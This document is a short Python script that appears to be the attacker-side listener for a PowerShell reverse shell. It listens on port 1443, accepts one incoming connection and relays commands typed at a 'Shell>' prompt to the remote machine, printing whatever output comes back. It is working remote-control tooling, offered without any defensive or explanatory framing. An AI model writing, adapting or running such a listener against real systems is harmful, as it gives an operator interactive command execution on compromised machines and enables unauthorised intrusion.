import socket
from datetime import datetime

HOST = '0.0.0.0'
PORT = 1443

def handler(conn, addr):
    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")
    try:
        while True:
            cmd = input("Shell> ")  # Clear prompt
            if not cmd.strip():
                continue  # Skip empty commands
            cmd += '\n'  # Critical newline for PowerShell input
            conn.sendall(cmd.encode('ascii'))

            response = b''
            conn.settimeout(2.0)  # Timeout ensures you don't hang forever
            try:
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(chunk) < 4096:
                        break
            except socket.timeout:
                pass  # Normal, just means we got all data

            print(response.decode('ascii', errors='ignore'))
    except (ConnectionResetError, BrokenPipeError):
        print("[!] Connection closed by remote host.")
    finally:
        conn.close()

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen(1)
        print(f"[+] PowerShell listener started on port {PORT}")
        conn, addr = s.accept()
        handler(conn, addr)

if __name__ == '__main__':
    main()
